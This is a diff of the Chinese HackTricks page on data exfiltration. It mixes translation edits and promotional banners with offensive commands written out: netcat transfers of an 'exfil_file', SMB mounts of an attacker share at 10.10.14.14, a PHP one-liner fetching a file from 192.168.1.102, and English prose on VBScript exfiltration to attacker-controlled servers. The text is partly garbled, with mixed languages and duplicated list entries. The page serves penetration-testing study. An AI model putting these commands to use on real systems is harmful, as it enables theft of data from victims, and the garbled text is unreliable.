@@ -1,20 +1,21 @@
 # 数据泄露
 
+{% hint style="success" %}
+学习并练习 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习并练习 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享黑客技巧。**
 
 </details>
+{% endhint %}
 
-**Try Hard Security Group**
+**Try Hard 安全团队**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -22,11 +23,11 @@
 
 ***
 
-## 常见的白名单域名用于信息泄露
+## 常见被允许的域名用于泄露信息
 
-查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域名
+查看 [https://lots-project.com/](https://lots-project.com/) 以找到常见被允许的域名，可以被滥用
 
-## 复制\&粘贴Base64
+## 复制并粘贴 Base64
 
 **Linux**
 ```bash
@@ -127,7 +128,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP服务器（NodeJS）
+### FTP 服务器 (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -189,73 +190,19 @@ Windows
 
 ---
 
-## Exfiltration
+### Exfiltration
 
-### Techniques
+Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-1. **Exfiltration Over C2 Channel**: Utilize the existing command and control channel to exfiltrate data.
+- **Email**: Sending data as email attachments to an external email address.
+- **FTP**: Transferring data using the File Transfer Protocol to an external server.
+- **DNS**: Sending data by encoding it within DNS requests to a controlled server.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
+- **Steganography**: Hiding data within other files or images to avoid detection.
+- **Cloud Storage**: Uploading data to cloud storage services such as Dropbox or Google Drive.
+- **Physical Media**: Copying data to removable storage devices like USB drives or external hard drives.
 
-2. **Exfiltration Over Alternative Protocol**: Use alternative protocols such as DNS, ICMP, or HTTP to exfiltrate data.
-
-3. **Exfiltration Over Unencrypted Protocols**: Leverage unencrypted protocols like FTP, Telnet, or HTTP to exfiltrate data.
-
-4. **Exfiltration Over Encrypted Protocols**: Utilize encrypted protocols like HTTPS or SSH to exfiltrate data.
-
-5. **Exfiltration Over Ingress Filtering**: Bypass egress filtering by exfiltrating data over allowed ingress channels.
-
-### Tools
-
-- **Netcat**: A versatile networking utility for reading from and writing to network connections.
-
-- **PowerShell**: A task automation framework for configuring systems and automating tasks.
-
-- **Certutil**: Command-line utility for managing certificates.
-
-- **Bitsadmin**: A tool to create and manage transfer jobs using Background Intelligent Transfer Service (BITS).
-
-- **FTP**: File Transfer Protocol for transferring files between a client and server on a network.
-
-- **Wget**: A command-line utility for downloading files from the web.
-
-- **Curl**: A tool for transferring data with URLs.
-
-- **SMBClient**: A tool for accessing shared folders.
-
-- **RDP**: Remote Desktop Protocol for remote access to Windows systems.
-
-- **WMIC**: Command-line tool for Windows Management Instrumentation.
-
-- **Reg**: Command-line utility for working with the registry.
-
-- **Schtasks**: Command-line tool for managing scheduled tasks.
-
-- **Bitsadmin**: Command-line tool for managing Background Intelligent Transfer Service (BITS) jobs.
-
-- **Vssadmin**: Command-line tool for managing Volume Shadow Copy Service.
-
-- **Wevtutil**: Command-line tool for managing event logs.
-
-- **Forfiles**: Command-line tool for batch processing files.
-
-- **Robocopy**: Command-line tool for copying files and directories.
-
-- **Diskshadow**: Command-line tool for managing shadow copies.
-
-- **Net**: Command-line tool for managing network resources.
-
-- **Tasklist**: Command-line tool for listing running processes.
-
-- **Taskkill**: Command-line tool for terminating processes.
-
-- **Regsvr32**: Command-line tool for registering and unregistering DLLs.
-
-- **Regini**: Command-line tool for modifying registry permissions.
-
-- **Regsvcs**: Command-line tool for registering and unregistering .NET components.
-
-- **Regsvr32**: Command-line tool for registering and unregistering DLLs.
-
-- **Regsvr32**: Command-line tool for registering and unregistering DLLs.
+Exfiltration can be a critical phase of an attack as it allows threat actors to steal valuable information from a target organization. Detection and prevention of exfiltration attempts are essential for maintaining the security of a system.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -277,7 +224,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## 网络通信
+## 网络通道
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -318,7 +265,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -350,7 +297,19 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic Script (VBScript) 是一种基于对象的脚本语言，通常用于 Windows 环境中。VBScript 可以通过多种方式进行数据泄露，包括通过网络传输数据，将数据写入文件，或者通过电子邮件发送数据。
+### VBScript Exfiltration Techniques
+
+VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
+
+1. **Writing to Files**: VBScript can write data to files on the system, which can then be exfiltrated using various methods.
+
+2. **Sending HTTP Requests**: VBScript can send HTTP requests to an external server controlled by the attacker, allowing data to be exfiltrated over the network.
+
+3. **Using Email**: VBScript can be used to send emails with attached data to an external email address controlled by the attacker.
+
+4. **Executing Commands**: VBScript can execute commands on the compromised system to exfiltrate data through the command line.
+
+5. **Encoding Data**: VBScript can encode exfiltrated data to bypass detection mechanisms and make it harder to detect the exfiltration.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -404,16 +363,17 @@ wine exe2bat.exe nc.exe nc.txt
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>支持HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。
 
 </details>
+{% endhint %}
